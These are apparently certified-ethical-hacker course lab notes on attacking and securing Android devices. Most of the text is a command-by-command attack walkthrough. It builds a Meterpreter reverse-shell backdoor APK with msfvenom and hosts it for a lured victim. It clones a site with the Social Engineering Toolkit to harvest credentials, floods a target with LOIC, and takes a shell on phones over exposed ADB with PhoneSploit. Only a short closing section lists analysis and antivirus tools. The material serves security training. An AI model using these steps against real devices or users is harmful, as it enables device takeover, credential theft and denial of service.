# Module 17 - Hacking Mobile Platforms #

## Hack Android Devices ##

### Creating Binary Payloads to Hack an Android Device ###
Open a Terminal in Android. 
``` su ``` > ``` ip addr add <IP Address with Mask> dev eth0 ``` - To assign the IP Address to the android device

#### msfvenom ####
In the attacker machine:

``` service postgresql start ```

``` msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=<Attacker IP> R > <Output Path>/Backdoor.apk ```

#### Creating a Directory to Share with the Victim ####
1. ``` mkdir /var/www/html/share ```
2. ``` chmod -R 755 /var/www/html/share ```
3. ``` chown -R www-data:www-data /var/www/html/share ```
4. ``` mv /root/Desktop/Backdoor.apk /var/www/html/share ``` - Moving the malicious file to the shared folder

#### Starting the Apache Server ####
``` service apache2 start ```

#### Metasploit ####
``` msfconsole ```

Steps to set up a listener:
1. ``` use exploit/multi/handler ```
2. ``` set payload android/meterpreter/reverse_tcp ```
3. ``` set LHOST <Attacker Listener IP> ```
4. ``` exploit -j -z ```

#### Luring the Victim ####
Now, the attacker should lure the victim to access: ```http://<Attacker IP>/share``` and download and execute the ```Backdoor.apk``` file.

#### Metasploit / Meterpreter ####
If Meterpreter does not start automatically interacting with the victim, type: ``` sessions -i 1 ```.


### Harvesting Users' Credentials ###
Open a Terminal in Android. 
``` su ``` > ``` ip addr add <IP Address with Mask> dev eth0 ``` - To assign the IP Address to the android device

#### Social Engineering Toolkit ####
The SET is an open-source tool that enables penetration testing via social engineering. In the attacker machine: launch the Social Engineering Toolkit.

1. Select ``` 1) Social-Engineering Attacks ```
2. Select ``` 2) Website Attack Vectors ```
3. Select ``` 3) Credential Harvester Attack Method ```
4. Select ``` 2) Site Cloner ```
5. Enter the attacker IP Address
6. Enter the URL to clone

#### Luring the Victim ####
Now, the attacker should lure the victim to access: ```http://<Attacker IP>```. The site will be cloned from the original one. Once the user enters credentials, they will be logged into SET. 


### Launch a DoS Attack ###
#### Low Orbital Cannon (LOIC) ####
It can be found at: `Module 17 Hacking Mobile Platforms\Android Hacking Tools\`. But in this lab, we'll launch it from the Android device: go to the 'Cx File Explorer' app > Click the IP from the shared computer (Ex. 10.10.10.10) > Go to the shared folder: 'CEH-Tools' > 'Module 17 Hacking Mobile Platforms' > 'Android Hacking Tools' > Install the 'LOIC' apk.

1. Type the target IP, select the TCP radio button, set the Port value to 80 and the number of Threads to 100 > 'Start'


### Exploit the Android Platform through ADB ###
Android Debug Bridge (ADB) is a versatile command-line tool that lets you communicate with a device. ADB facilitates a variety of device actions such as installing and debugging apps, and provides access to a Unix shell that you can use to run several different commands on a device. Usually, developers connect to ADB by using a USB cable, but it is also possible to do so wirelessly by enabling a daemon server at port TCP 5555 on the device.

On the Parrot attacker machine: `apt-get install adb`.

#### PhoneSploit ####
It can be downloaded: `git clone https://github.com/01010000-kumar/PhoneSploit`. Or in Windows at: `Module 17 Hacking Mobile Platforms\GitHub Tools\`. Then, proceed with the installation of dependencies: `python3 -m pip install colorama`. 

`python3 phonesploit.py`

The main menu appears, with options like:
1) Show connected devices
2) Disconnect all devices
3) Connect a new phone
4) Access Shell on a phone
5) Install an apk on a phone
6) Screen record a phone
7) Screen Shot a picture on the phone
8) Restart Server
9) Pull folders from the phone to the pc
10) Turn the device off
11) (...)

Steps:
1. First, we'll connect a new phone by selecting option number 3: `[3] Connect a new phone`.
2. Enter the phone's IP Address to connect to it via the port 5555
3. Now, the main menu appears again, let's access the phone's shell: `[4] Access Shell on a phone`.
4. Enter the phone's IP Address, and then we'll get a shell
5. We can do whatever further steps we want with the given options

#### Other Android Hacking Tools ####
* NetCut (http://www.arcai.com)
* drozer (https://labs.f-secure.com)
* zANTI (https://www.zimperium.com)
* Network Spoofer (https://www.digitalsquid.co.uk)
* DroidSheep (https://droidsheep.info)


- - - -

## Secure Android Devices ##

### Analyze a Malicious App ###
#### Online Android Analyzers ####
* Sixo Online APK Analyzer (https://sisik.eu/apk-tool)
* DeGuard
* AVC UnDroid (https://undroid.av-comparatives.org)
* SandDroid (http://sanddroid.xjtu.edu.cn)
* Apktool (http://www.javadecompilers.com)
* Apprisk Scanner (https://apprisk.newskysecurity.com)


### Android App Vulnerability Scanners ###
* Quixxy Vulnerability Scanner (https://vulnerabilitytest.quixxi.com/)
* X-Ray (https://duo.com)
* Vulners Scanner (Google Play Store)
* Shellshock Vulnerability Scan (Google Play Store)
* Yaazhini (https://www.vegabird.com)
* Quick Android Review Kit (QARK - GitHub)


### Secure Android Devices from Malicious Apps ###
#### Malwarebytes Security ####
Malwarebytes is an antimalware mobile tool that provides protection against malware, ransomware... It blocks, detects, and removes adware and malware, conducts privacy audits for all apps, and ensures a safer browsing.

#### Other Mobile Antivirus Tools ####
* AntiSpy Mobile (https://antispymobile.com)
* Spyware Detector - Anti Spy Privacy Scanner (Google Play Store)
* iAmNotified - Anti Spy System (https://iamnotified.com)
* Privacy Scanner (AntiSpy) Free (Google Play Store)
